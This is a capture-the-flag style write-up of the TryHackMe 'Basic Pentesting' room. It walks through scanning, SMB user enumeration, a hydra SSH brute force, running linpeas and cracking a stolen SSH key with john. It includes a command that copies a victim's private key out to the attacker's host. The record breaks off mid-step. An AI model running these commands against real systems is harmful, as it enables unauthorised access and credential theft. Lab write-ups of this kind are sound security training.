# Try Hack Me Writeup - Basic Pentesting

THM Room is here: https://tryhackme.com/room/basicpentestingjt

In this room, there's some featured youtube video you can follow if you want: https://www.youtube.com/watch?v=xl2Xx5YOKcI

[![Youtube video](https://img.youtube.com/vi/xl2Xx5YOKcI/0.jpg)](https://www.youtube.com/watch?v=xl2Xx5YOKcI)

Listen and follow what that nice guy is telling and showing. Subscribe to his channel or so.

Note that what is seen there in the video doesn't 100% match with what I have seen at the moment of writing this writeup. Like my ``nmap`` scan result which shows more open ports. Although I used exactly the same nmap command. 

## Task 1 - Web App Testing and Privilege Escalation

In these set of tasks you'll learn the following:

* brute forcing
* hash cracking 
* service enumeration
* Linux enumeration

The main goal here is to learn as much as possible. Make sure you are connected to our network using your [OpenVPN configuration file](https://tryhackme.com/access).

### Deploy the machine and connect to our network

    No answer needed.

Start the Virtual Machine of Try Hack Me provided into this room. 

(temp) IP of the target Virtual Machine: `10.10.206.175` 

Once the ``THM`` virtual machine booted up, I can start to work on my local ``Kali`` virtual machine and in the virtual machine start my ``openvpn`` connection to connect to the ``THM`` network.

### Find the services exposed by the machine

    No answer needed.

Let's start with a ``nmap`` scan and save the results in `~/nmap_scan_results/initial`.

```commandline
mkdir ~/nmap_scan_results
nmap -sC -sV -oN ~/nmap_scan_results/initial 10.10.206.175
```

Open Ports:

```commandline
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat 9.0.7
```

### What is the name of the hidden directory on the web server(enter name without /)?

So let's see what's running on the web server. Use web browser and point to http://10.10.206.175.

The page displays a simple message: `Undergoing maintenance. Please check later`. Without anything else.

![alt text](images/THM_writeup_basic_pentesting_001.png "Web Server Screenshot")

When looking to the source code of the page I get some hint: `<!-- Check our dev note section if you need to know what to work on. -->`.

![alt text](images/THM_writeup_basic_pentesting_002.png "Web Server Screenshot")

When trying to go on http://10.10.206.175/dev/ it does give us a 404 but tells use it's running Apache/2.4.18 (Ubuntu) Server.

My second guess http://10.10.206.175/development/ and there you go.

![alt text](images/THM_writeup_basic_pentesting_003.png "Web Server Screenshot")

Content of the ``dev.txt`` file:

```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

Content of the ``j.txt`` file:

```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K

```

Anyway let's scan the web server with `gobuster` to try to discover hidden files and folders we don't know, we never know.

But note to read the manual, not the `man gobuster` as there's none and the `gobuster --help` lacks of information to allow make straight use of this application. I could find out the new usage method by looking at the output of `dpkg -L gobuster` which showed me all the files this package contains.

So let's read the usage:

```commandline
zless /usr/share/doc/gobuster/README.md.gz
```

Launch `gobuster` now and save the scan result in `gobuster_scan_result`

```commandline
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.206.175/ -o gobuster_scan_result
```

**Gobuster is soooooo slooooooow!**

The gobuster output (look into the gobuster_scan_result we asked to create):

```
/development          (Status: 301) [Size: 320] [--> http://10.10.206.175/development/]
/server-status        (Status: 403) [Size: 301]
```

### User brute-forcing to find the username & password

No answer required.

At this point we don't know what service to brute-force the passowrd, nor do we have user names. The only thing we know from ``j.txt`` is that the password is weak. We first need to continue to investigate as we still don't have user names so far. We only know that there are 2 user name and one of them start with `j` and the other one `k`

Let's enumerate the ``Samba`` server to see what's up there. We will pipe the output trough ``tee`` to make a log file as the output of ``enum4linux`` is very long.

```commandline
enum4linux -a 10.10.206.175 | tee enum4linux.log
```

After the enumaration on the Samba server is done, we can look into our generated ``enum4linux.log`` file. Interesting parts are these:

Found some Anonymous share:

```

```

Found 2 usernames:

```
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```

### What is the username?

    jan

### What is the password?

    armando

Will use hydra to bruteforce the ssh server, in the hope there's no ``fail2ban`` system. I will also time the bruteforce, just for curiosity.

```
time hydra -t 50 -l jan -P /root/rockyou.txt ssh://10.10.206.175
```

**Note that this should be not on the by default compressed rockyou.txt.gz file. Otherwise this will fail.**

![alt text](images/THM_writeup_basic_pentesting_004.png "hydra found the password Screenshot")

As hydra is taking a long time to bruteforce both user names, we will try to put some other tasks to run. At this point we have already the password of `jan`, so let's try to ssh into that system and try to find some information.

`ssh jan@10.10.206.175 `with password `armando` does work :-)

We want to look if there's no other way to gain more information and access. The `linepeas.sh` script is ideal for this as it can look for various know privilege escalations.

```commandline
# Download linpeas to the kali machine as kali does not provide this yet 
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
chmod +x linepeas.sh

# ssh this to the victims computer, as there's no internet access on that THM virtual machine.
# We copy that in the /tmp directory as in this VM victim simulation, /home/jan is not writeable. So let's abuse /tmp
scp /home/itchy/Downloads/linpeas.sh jan@10.10.206.175:/tmp/

# Now let's log back to that victims machine with the account of jan
ssh jan@10.10.206.175
cd /tmp/
chmod +x linpeas.sh

# Make use of that linepeas script to find out some priviledge escalations
./linpeas.sh | tee linpeas.log
```

Even if we logged the stdout to `linpeas.log`. It is way more easy to scroll back and look into the console as `linpeas` make use of colors. And we want to look for things marked in yellow and red in the console output!

![alt text](images/THM_writeup_basic_pentesting_005.png "linpeas script make use of colors in the console")

Thanks to `linpeas.log` we found out that `/home/kay/.ssh/id_rsa` is readable by everyone. Also note that `PubkeyAuthentication yes` the sshd config allows us to log in with the pubkey.

```

So let's try to make use of `this id_rsa` key of the user kay to log in without password:

```commandline
cd /home/kay/.ssh/
ssh -i id_rsa kay@10.10.206.175
Could not create directory '/home/jan/.ssh'.
The authenticity of host '10.10.206.175 (10.10.206.175)' can't be established.
ECDSA key fingerprint is SHA256:+Fk53V/LB+2pn4OPL7GN/DuVHVvO0lT9N4W5ifchySQ.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/jan/.ssh/known_hosts).
Enter passphrase for key 'id_rsa':
```

No luck in the much luck. This private key is password protected. So we have to try to attempt to crack this with `john the ripper`. But we don't have these tools on that victim's computer. So copy the content of the `id_rsa` key manually to our kali box `cat id_rsa` and copy paste that into a new text file something like `kay_id_rsa` and in theory `chmod 600 kay_id_rsa` as that is supposed to be only readable by the concerned user.

We can try to crack this with `john` but we need to prepare the `kay_id_rsa` file so that `john` can work with it.

```commandline
/usr/share/john/ssh2john.py kay_id_rsa > forjohntheripper.txt

john forjohntheripper.txt --wordlist=/usr/share/wordlists/rockyou.txt.gz
```

So let's try this:

On the kali machine

    systemctl start ssh.socket

On the victims

    scp id_rsa itchy@10.8.208.30:/tmp

On the kali machine again and we stay here now:

    cp /tmp/id_rsa kay_id_rsa2
    /usr/share/john/ssh2john.py kay_id_rsa2 > forjohntheripper2.txt
    john forjohntheripper2.txt --wordlist=/usr/share/wordlists/rockyou.txt.gz

This gives the same strange result. Found out because the rockyou.txt.gz is gunziped and apparantly these programs can't handle it. Do idea why this file is compressed as this is provided this way by Kali.

![alt text](images/THM_writeup_basic_pentesting_008.png "john the ripper found the password screenshot")

Let's try to log in with that rsa key as we have the password now. I will log in with ssh from the victims machine to leave as less as possible traces:
